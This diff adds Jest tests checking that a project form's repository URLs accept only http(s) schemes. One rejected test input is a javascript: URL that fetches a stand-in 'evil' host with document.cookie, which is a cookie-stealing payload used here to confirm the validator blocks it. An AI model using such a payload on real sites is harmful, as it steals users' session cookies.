@@ -39,6 +39,35 @@ describe('projectFormSchema', () => {
     expect(projectFormSchema.safeParse({ ...validInput, repositories }).success).toBe(false);
   });
 
+  describe('repositories', () => {
+    const REPOSITORY_SCHEME_MESSAGE =
+      '리포지토리는 http:// 또는 https://로 시작하는 주소만 입력할 수 있습니다';
+    const parseRepositories = (repositories: string[]) =>
+      projectFormSchema.safeParse({ ...validInput, repositories });
+
+    it('http(s) 주소만 있으면 통과시킨다', () => {
+      expect(
+        parseRepositories([
+          'https://github.com/themoment-team/datagsm-client',
+          'http://git.example.com/repo',
+        ]).success,
+      ).toBe(true);
+    });
+
+    it.each([
+      "javascript:fetch('//evil?'+document.cookie)",
+      'ftp://example.com/repo',
+      'github.com/repo',
+    ])('%s가 섞여 있으면 실패한다', (repository) => {
+      const result = parseRepositories(['https://github.com/themoment-team', repository]);
+
+      expect(result.success).toBe(false);
+      expect(result.error?.issues).toContainEqual(
+        expect.objectContaining({ path: ['repositories'], message: REPOSITORY_SCHEME_MESSAGE }),
+      );
+    });
+  });
+
   describe('deploymentUrl', () => {
     const parseUrl = (deploymentUrl: string) =>
       projectFormSchema.safeParse({ ...validInput, deploymentUrl });
